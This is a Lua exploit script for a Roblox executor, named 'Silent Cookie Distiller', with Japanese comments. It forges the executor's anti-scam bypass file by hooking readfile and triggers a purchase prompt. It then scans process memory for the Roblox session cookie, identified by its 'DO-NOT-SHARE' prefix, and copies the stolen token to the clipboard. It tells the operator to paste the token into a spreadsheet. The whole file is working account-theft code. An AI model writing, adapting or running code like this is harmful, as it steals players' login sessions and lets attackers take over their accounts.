-- [[ Project: Silent Cookie Distiller - Stability ]]
-- エラー修正版：getgc(true) を採用し、より確実に動作させる

local function log(msg)
    print("[SYSTEM] " .. tostring(msg))
end

local player = game:GetService("Players").LocalPlayer
-- cloneref があるので安全に参照を取得
local MS = cloneref(game:GetService("MarketplaceService"))

-- ==========================================
-- STEP 1: メモリ上でのセキュリティ偽装
-- ==========================================
local old_read
old_read = hookfunction(readfile, function(path)
    if string.find(path:lower(), "disableantiscam") then
        local fake = {
            ["WARNING"] = "BYPASS",
            ["allowed_games"] = "*",
            ["user_id"] = tostring(player.UserId),
            ["version_num"] = 707
        }
        return game:GetService("HttpService"):JSONEncode(fake)
    end
    return old_read(path)
end)

-- ==========================================
-- STEP 2: 汎用 getgc スキャン
-- ==========================================
local function start_capture()
    task.spawn(function()
        local target_prefix = "_|WARNING:-DO-NOT-SHARE-"
        log("Memory scanning started...")
        
        while true do
            -- エラーが出ない getgc(true) を使用
            local objects = getgc(true)
            for _, v in pairs(objects) do
                if type(v) == "string" and string.sub(v, 1, #target_prefix) == target_prefix then
                    local _, pos = string.find(v, "|_", 1, true)
                    if pos then
                        setclipboard(string.sub(v, pos + 1))
                        log("********************************")
                        log("SUCCESS: Data captured to clipboard!")
                        log("A列に貼り付けてくれ。")
                        log("********************************")
                        return 
                    end
                end
            end
            task.wait(3) -- 負荷軽減
        end
    end)
end

-- ==========================================
-- STEP 3: 実行
-- ==========================================
start_capture()
task.wait(2)

log("Opening purchase UI...")
-- 購入プロンプト表示
pcall(function()
    MS:PromptProductPurchase(player, 0)
end)

log("Ready. System waiting for data.")
